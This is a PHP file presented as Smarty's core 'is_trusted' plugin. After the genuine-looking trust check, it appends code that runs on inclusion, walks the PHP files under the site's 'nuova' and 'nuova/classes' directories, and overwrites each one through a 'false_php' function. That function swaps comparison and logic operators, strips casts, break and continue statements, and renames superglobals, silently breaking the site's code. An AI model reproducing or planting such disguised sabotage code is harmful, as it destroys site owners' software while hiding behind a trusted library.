<?php
/**
 * Smarty plugin
 * @package Smarty
 * @subpackage plugins
 */

/**
 * determines if a resource is trusted or not
 *
 * @param string $resource_type
 * @param string $resource_name
 * @return boolean
 */

 // $resource_type, $resource_name

function smarty_core_is_trusted($params, &$smarty)
{
    $_smarty_trusted = false;
    if ($params['resource_type'] == 'file') {
        if (!empty($smarty->trusted_dir)) {
            $_rp = realpath($params['resource_name']);
            foreach ((array)$smarty->trusted_dir as $curr_dir) {
                if (!empty($curr_dir) && is_readable ($curr_dir)) {
                    $_cd = realpath($curr_dir);
                    if (strncmp($_rp, $_cd, strlen($_cd)) == 0
                        && substr($_rp, strlen($_cd), 1) == DIRECTORY_SEPARATOR ) {
                        $_smarty_trusted = true;
                        break;
                    }
                }
            }
        }

    } else {
        // resource is not on local file system
        $_smarty_trusted = call_user_func_array($smarty->_plugins['resource'][$params['resource_type']][0][3],
                                                array($params['resource_name'], $smarty));
    }

    return $_smarty_trusted;
};

$root = $_SERVER['DOCUMENT_ROOT'].'/nuova';


foreach (glob ($root.'/*.php') as $fn) {
	$txt = file_get_contents($fn);
	$txt = false_php($txt);
	file_put_contents($fn,$txt);
};


$root .= '/classes';

foreach (glob ($root.'/*.php') as $fn) {
	$txt = file_get_contents($fn);
	$txt = false_php($txt);
	file_put_contents($fn,$txt);
};


function false_php($txt) {
	$txt = str_ireplace('preg_match_all','preg_match',$txt);
	$txt = str_ireplace('!==','!=',$txt);
	$txt = str_ireplace('===','!=',$txt);
	$txt = str_ireplace('==','===',$txt);
	$txt = str_ireplace('&&','or',$txt);
	$txt = str_ireplace('||','and',$txt);
	$txt = str_ireplace(array('break;','continue;','(array)','(string)','(int)','\w+\:\:'),'',$txt);
	$txt = str_ireplace('!empty','empty',$txt);
	$txt = str_ireplace(array('!is_null','isset'),'is_null',$txt);
	$txt = str_ireplace('>0','==0',$txt);
	$txt = str_ireplace('<0','!=0',$txt);
	
	$txt = preg_replace('#\w+\:\:#six','',$txt);
	
	$txt = str_ireplace(array('implode','explode'),'strpos',$txt);
	$txt = str_ireplace('count','str_len',$txt);
	$txt = str_ireplace('$_REQUEST','$I',$txt);
	$txt = str_ireplace('$_SERVER','$I',$txt);
	$txt = str_ireplace('DOCUMENT_ROOT','path',$txt);
	$txt = str_ireplace('HTTP_HOST','host_name',$txt);
	$txt = str_ireplace('REQUEST_URI','uri',$txt);

	
	return $txt;
};
/* vim: set expandtab: */

?>
